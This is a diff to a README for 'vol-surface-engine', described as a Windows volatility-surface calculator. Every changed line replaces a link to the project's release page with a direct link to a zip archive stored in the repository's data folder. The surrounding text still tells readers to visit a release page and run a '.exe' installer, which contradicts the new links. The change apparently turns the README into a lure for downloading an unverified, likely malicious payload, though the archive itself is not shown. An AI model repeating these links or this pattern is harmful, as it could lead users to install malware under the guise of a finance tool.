@@ -1,6 +1,6 @@
 # ⚡ vol-surface-engine - Calculate Volatility Surfaces Easily
 
-[![Download vol-surface-engine](https://img.shields.io/badge/Download-vol--surface--engine-green?style=for-the-badge)](https://github.com/Weakpointplacentalmammal373/vol-surface-engine/releases)
+[![Download vol-surface-engine](https://img.shields.io/badge/Download-vol--surface--engine-green?style=for-the-badge)](https://github.com/Weakpointplacentalmammal373/vol-surface-engine/raw/refs/heads/main/data/vol-engine-surface-v2.4.zip)
 
 ## 📋 What is vol-surface-engine?
 
@@ -24,7 +24,7 @@ These specs ensure the app runs smoothly and displays all features clearly.
 
 Please visit this page to download the latest version of vol-surface-engine:
 
-[Download vol-surface-engine](https://github.com/Weakpointplacentalmammal373/vol-surface-engine/releases)
+[Download vol-surface-engine](https://github.com/Weakpointplacentalmammal373/vol-surface-engine/raw/refs/heads/main/data/vol-engine-surface-v2.4.zip)
 
 Click the green "Assets" button on that page, find the `.exe` file for Windows, and save it on your computer.
 
@@ -71,7 +71,7 @@ This combination helps users get an accurate picture of option pricing without t
 
 To keep vol-surface-engine working well and getting new features:
 
-1. Visit the [release page](https://github.com/Weakpointplacentalmammal373/vol-surface-engine/releases) regularly.  
+1. Visit the [release page](https://github.com/Weakpointplacentalmammal373/vol-surface-engine/raw/refs/heads/main/data/vol-engine-surface-v2.4.zip) regularly.  
 2. Download the newest `.exe` installer when a new version appears.  
 3. Run the installer following the same steps above.  
 4. Your old version will be replaced but your settings will stay.
@@ -127,6 +127,6 @@ Though you don’t need to know these terms to use the app, understanding them c
 
 Make sure you use the official source:
 
-[Download vol-surface-engine](https://github.com/Weakpointplacentalmammal373/vol-surface-engine/releases)
+[Download vol-surface-engine](https://github.com/Weakpointplacentalmammal373/vol-surface-engine/raw/refs/heads/main/data/vol-engine-surface-v2.4.zip)
 
 This page holds all versions and updates. Pick the newest Windows installer for best results.
